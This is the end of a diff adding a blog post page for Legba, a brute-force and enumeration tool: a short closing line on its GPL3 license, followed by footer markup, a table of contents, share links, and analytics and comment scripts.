+<h2 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h2><p>As usual, the tool is released under the GPL3 license and all contributions are more than welcome. Enjoy ^_^</p>
+
+  </div>
+  <a target="_blank" rel="noopener" href="https://www.patreon.com/bePatron?u=6065463" data-patreon-widget-type="become-patron-button">Become a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script>
+  <br/>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">~/</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rust-Async-FTW"><span class="toc-number">2.</span> <span class="toc-text">Rust + Async FTW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-Framework-For-Everything"><span class="toc-number">3.</span> <span class="toc-text">A Framework For Everything</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#All-the-HTTP-Things"><span class="toc-number">3.1.</span> <span class="toc-text">All the HTTP Things</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Subdomain-Enumeration"><span class="toc-number">3.2.</span> <span class="toc-text">DNS Subdomain Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-Port-Scanning"><span class="toc-number">3.3.</span> <span class="toc-text">TCP Port Scanning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other-Protocols"><span class="toc-number">3.4.</span> <span class="toc-text">Other Protocols</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fin"><span class="toc-number">4.</span> <span class="toc-text">Fin</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&text=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&is_video=false&description=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Enumerate/Bruteforce/Attack All the Things! Presenting Legba&body=Check out this article: https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&name=Enumerate/Bruteforce/Attack All the Things! Presenting Legba&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2023 Simone Margaritelli
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">~/</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-22026549-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'evilsocket';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4da572964da15ce9" async="async"></script>
+
